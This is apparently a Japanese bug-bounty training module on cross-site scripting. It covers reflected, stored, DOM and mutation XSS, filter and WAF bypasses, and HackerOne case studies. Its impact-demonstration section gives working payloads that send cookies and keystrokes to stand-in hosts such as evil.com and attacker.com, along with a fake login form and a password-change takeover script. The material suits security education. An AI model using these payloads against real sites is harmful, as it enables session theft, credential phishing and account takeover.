XSS (Cross-Site Scripting)

攻撃者が被害者のブラウザ上で任意の JavaScript を実行する。 BB で最も報告数が多い脆弱性クラスの1つ。

Theory WSA Lab Hands-on
Prerequisites (前提知識)

Module 00 (HTTP) と Module 01 (Browser Security) を先に完了してください。特に SOP, Cookie, CSP の理解が XSS の impact を正しく評価するために必要です。

まず体感する: 30秒で分かる XSS

ブラウザの DevTools コンソール (F12 → Console) を開いて、以下を入力してみよう:

document.body.innerHTML = '<h1>ページを書き換えた!</h1>';

ページの内容が書き変わったはず。これが JavaScript でできること。 XSS とは、攻撃者がこのような JavaScript を、他人のブラウザ上で実行させる攻撃だ。

ここで使った innerHTML は DOM (Document Object Model = ブラウザがHTMLをJavaScriptで操作するためのツリー構造) を直接操作するプロパティ。 これが攻撃の「出口」(Sink) になる。

XSS の原理

Webアプリケーションが ユーザー入力を適切にサニタイズ (=危険な文字を除去/無害化) せずに HTML/JavaScript として出力 すると、 攻撃者が注入したスクリプトが被害者のブラウザで実行される。

結果として: セッションの窃取、フィッシング、キーロギング、他ユーザーへのアクション実行（アカウント乗っ取り）が可能になる。

XSS の Impact (BB 観点)

単純な alert(1) だけでは Low〜Medium 評価になりがち。 BB で高い severity を得るには 実際の impact を示す ことが重要:

  • Account Takeover (ATO): セッション Cookie 窃取 or パスワード変更実行
  • Stored XSS + Admin panel: 管理者の権限で任意操作
  • Self-XSS + CSRF chain: 被害者に self-XSS を踏ませる

XSS の種類

1. Reflected XSS

ユーザーの入力がリクエスト内に含まれ、レスポンスにそのまま反射 (reflect) される。 攻撃者は悪意あるURLを被害者に踏ませる必要がある。 

// 脆弱なサーバー側コード (Express)
app.get('/search', (req, res) => {
    res.send(`<h1>検索結果: ${req.query.q}</h1>`);
});

// Attack URL
https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>

2. Stored XSS (Persistent XSS)

攻撃者の入力がサーバーに保存され、他のユーザーがそのページを表示するたびにスクリプトが実行される。 Impact が高い（被害者がリンクを踏む必要がない）。 

// プロフィール表示 (脆弱)
<div class="bio">${user.bio}</div>

// 攻撃者が bio に設定
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

3. DOM-based XSS

サーバーを経由せず、クライアントサイドの JavaScript がユーザー入力を unsafe な方法で DOM に書き込む。 レスポンス body には payload が含まれないため、WAF での検知が困難。 

// 脆弱な JS コード
const hash = location.hash.slice(1);
document.getElementById('output').innerHTML = hash;

// Attack URL
https://example.com/page#<img src=x onerror=alert(document.domain)>

4. Mutation XSS (mXSS)

HTMLサニタイザーが安全と判定した HTML が、ブラウザの DOM パーサーによる正規化 (mutation) の結果 実行可能な形に変化する。DOMPurify の bypass 事例が有名。 

// サニタイザーは安全と判定するが、ブラウザのparser が mutation する例
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>

XSS の検出方法

Step 1: Reflection Point の発見

  1. 全ての入力ポイントに一意のプローブ文字列を送る (例: xss123test)
  2. レスポンス内でプローブがどこに出力されるか確認
  3. 出力コンテキストを特定: HTML body? 属性内? JavaScript 内? URL 内?

Step 3: Filter / WAF Bypass

  • Case variation: <ScRiPt>, <IMG SRC=x ONERROR=alert(1)>
  • Event handler 列挙: onload, onerror, onfocus, onmouseover, onanimationend...
  • Tag 列挙: <svg>, <math>, <details>, <video>, <body>...
  • Encoding: HTML entity (&#x61;lert(1)), Unicode escapes (JS内)
  • Double encoding: %253Cscript%253E (サーバーが2回 decode する場合)
  • Null byte: %00 (一部パーサーでの切り捨て)
  • Dangling markup: 完全なスクリプト注入が無理な場合、属性を壊してデータを外部に送る
自動化ツール
  • Burp Intruder: tag/event handler の全組み合わせを自動テスト
  • XSStrike: DOM / Reflected 両方を自動検出
  • dalfox: パラメータ単位の XSS スキャナー

防御手法とその Bypass

HTML Encoding

< → &lt;, > → &gt;, " → &quot; 等。 正しく実装されていれば HTML body context の XSS は防げる。

Bypass: JavaScript context 内では HTML encoding が効かない。var x = '{{input}}' に '; alert(1); // を入れても encoding されない。

Blocklist フィルター

<script> や alert をブロック。

Bypass: 別のタグ + event handler (<img onerror>)、別の関数 (confirm, prompt, print, window['al'+'ert'](1))

WAF (Web Application Firewall)

ネットワークレベルで payload を検知してブロック。

Bypass: chunked encoding, HTTP/2 binary framing, Unicode normalization, parameter pollution

CSP (Content Security Policy)

XSS が成功しても、スクリプトの実行を制限する defense-in-depth。

Bypass: CSP module (01-browser-security.html) 参照。unsafe-inline, JSONP on whitelisted domain, base-uri 等。

Impact Demonstration (BB report で使う)

Session 窃取 (HttpOnly なし)

<script>
fetch('https://attacker.com/log?c=' + document.cookie);
</script>

Account Takeover (パスワード変更)

<script>
// CSRF token を取得してパスワードを変更
fetch('/settings')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf_token.*?value="(.*?)"/)[1];
    fetch('/settings/password', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `csrf=${token}&new_password=hacked123&confirm=hacked123`
    });
  });
</script>

Keylogger

<script>
document.onkeypress = e => {
  fetch('https://attacker.com/keys?k=' + e.key);
};
</script>

Phishing (偽ログインフォーム)

<script>
document.body.innerHTML = `
  <h2>Session expired. Please login again.</h2>
  <form action="https://attacker.com/phish" method="POST">
    <input name="email" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button>Login</button>
  </form>`;
</script>
注意: BB report での PoC

実際のBBレポートでは alert(document.domain) または alert(document.cookie) で十分。 実際に Cookie を外部に送信する PoC は 自分の管理下のサーバーに限定 し、 他のユーザーに影響を与えないこと。

Real-World Reports (HackerOne 実例解析)

実際に報奨金が支払われた XSS レポートから、どこで見つけたか・どう chain したか・なぜ高額になったかを分析する。 出典: hackerone-reports (Top by bug type)

Case 1: PayPal Stored XSS via Cache Poisoning ($18,900 + $20,000)

Report: #488147 + #510152 (bypass)

仕組み:

  1. PayPal のログインページ (paypal.com/signin) が CDN 経由で配信されている
  2. 攻撃者が Cache Poisoning でログインページの HTML に悪意ある script を注入
  3. キャッシュされた汚染ページが 全ユーザーに配信 される (Stored XSS 相当)
  4. ログインフォームのクレデンシャルを窃取 → Account Takeover

なぜ高額:

  • ログインページ = 全ユーザーが通るクリティカルパス
  • Cache Poisoning で「攻撃者のアクション1回」で全ユーザーに影響
  • 最初の修正をbypassした #510152 がさらに $20,000

学び: XSS 単体では Medium だが、Cache Poisoning と組み合わせると Stored 相当 + mass impact になり Critical に昇格する。Phase 4 の Web Cache Poisoning で詳細。

Case 2: Reddit 1-Click ATO via Apple Sign-In + XSS (500 upvotes)

Report: #1567186 (500 upvotes)

仕組み:

  1. Apple Sign-In の OAuth flow で response_type を code から code id_token に変更
  2. Apple が id_token を fragment (#) に付けて redirect する
  3. Redirect 先が www.redditmedia.com (XSS あり) を経由
  4. XSS で fragment の id_token を窃取 → 被害者のアカウントに Apple Sign-In でログイン

学び: OAuth の response_type 変更 + open redirect + XSS の 3-step chain。 単体では Low の XSS が OAuth token theft の踏み台になると Critical。 Phase 4 の OAuth Attacks で詳細。

Case 3: GitLab Stored XSS via Kroki Diagram ($13,950)

Report: #1731349 (292 upvotes)

仕組み:

  1. GitLab の Markdown 内で Kroki ダイアグラムを埋め込める機能
  2. Kroki のレンダリング結果 (SVG) が サニタイズ不足で返される
  3. SVG 内に <script> や event handler を含めると実行される
  4. Issue / MR の description に書くだけで、閲覧者全員に XSS が発火 (Stored)

学び: Markdown レンダラーの外部サービス連携 (Kroki, Mermaid 等) は XSS の温床。 SVG は「画像」だが script を含められる。Content-Type: image/svg+xml で inline 表示されると危険。

Case 4: Shopify DOM XSS via postMessage ($9,400)

Report: #1444682 (234 upvotes)

仕組み:

  1. Shopify の管理画面が window.addEventListener('message', ...) でクロスオリジンメッセージを受信
  2. Origin の検証が不十分 (正規表現のミス or 未検証)
  3. 攻撃者の iframe から postMessage で DOM に HTML を注入
  4. Admin セッションで任意操作が可能に

学び: postMessage は DOM XSS の主要 source。 検出方法: JS ファイル内で addEventListener('message' を grep → handler 内で origin チェックの有無を確認 → innerHTML / eval 等の sink に到達するか追跡。

Case 5: Valve (Steam) XSS → RCE via Electron ($7,500)

Report: #409850 (485 upvotes)

仕組み:

  1. Steam のチャットクライアントが React ベースで、一部の入力がサニタイズされていない
  2. チャットメッセージ内の特定のフォーマットで XSS が発火
  3. Steam クライアント = Electron ベース → XSS が Node.js コンテキストで動く
  4. Node.js API 経由でローカルファイルの読み書き、コマンド実行が可能 (RCE)

学び: Electron アプリの XSS は Web アプリの XSS と比べて impact が桁違い。 nodeIntegration: true / contextIsolation: false の設定だと XSS = RCE。 Desktop アプリの BB プログラムは特に狙い目。

低額 XSS を避けるには

Self-XSS (自分にしか影響しない) や CSP で完全にブロックされる XSS は Informative / Low 扱いになりがち。report 前に以下を確認:

  • 被害者が攻撃者の link をクリック or ページを閲覧するだけで発火するか？
  • CSP が script-src 'self' のみで bypass 不可能ではないか？
  • Impact を ATO / data theft / privilege escalation まで chain できるか？

Key Takeaways

  • 出力コンテキストを必ず特定する — HTML body, 属性, JS 内, URL で payload が全く違う
  • DOM XSS は server response に痕跡が残らない — JS ファイルの source→sink 分析が必要
  • Impact を示す — alert() だけでなく ATO/data theft の PoC を付ける
  • Stored > Reflected — 保存型は被害者がリンクを踏む必要がない分、severity が高い
  • CSP は defence-in-depth — XSS が見つかっても CSP が堅ければ severity は下がる
  • mXSS — HTML サニタイザーを使っていても安心できない（ブラウザの DOM 正規化で突破される）
